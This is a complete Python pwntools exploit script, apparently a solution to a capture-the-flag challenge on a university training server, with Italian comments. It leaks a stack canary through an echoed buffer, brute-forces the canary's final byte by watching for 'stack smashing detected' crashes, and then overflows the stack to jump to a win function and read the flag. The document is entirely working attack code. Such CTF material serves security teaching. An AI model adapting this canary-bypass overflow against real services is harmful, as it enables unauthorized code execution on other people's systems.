from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50200

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

# Ottenuto impostando un breakpoint prima del canary, impostando set follow-fork-mode child in modo da seguire il processo figlio,
# dandogli in pasto un pattern create 100, guardando il contenuto di rbp e infine ottenendo l'offset tramite pattern offset 0x616161616161616a

offset = 72

# Ottenuto tramite p win

win_address = 0x4011f6

base_payload = b"A" * offset

conn.recvuntil(b"3. Exit\n")
conn.sendline(b"1")
conn.recvline()
conn.sendline(base_payload)

conn.recvuntil(b"You said: " + b"A"*offset + b"\n")     # \n aggiunto da sendline

canary = b"\x00" + conn.recv(6)
# for i in range(len(canary)):
#     print(hex(canary[i]))

for i in range(0xff):
    conn.recvuntil(b"3. Exit\n")
    conn.sendline(b"2")         # Choose to use toUppercase function

    payload = base_payload + canary + bytes([i])
    print(f"{i}-th payload: {payload}")

    conn.sendlineafter(b"uppercased: ", payload)

    crashLine = conn.recvuntil(b"Available commands")
    print(crashLine)
    if(not (b"stack smashing detected" in crashLine)):
        canary += bytes([i])
        print(f"Canary cracked")
        break


payload = base_payload + canary + b"B"*8 + p64(win_address)
print(payload)

conn.recvuntil(b"3. Exit\n")
conn.clean()
conn.sendline(payload)
conn.recvuntil(b"3. Exit\n")
conn.sendline(b"3")

conn.recvuntil(b"Here is the flag: ")
flag = conn.recvline(keepends=False).decode()
conn.close()
print(flag)
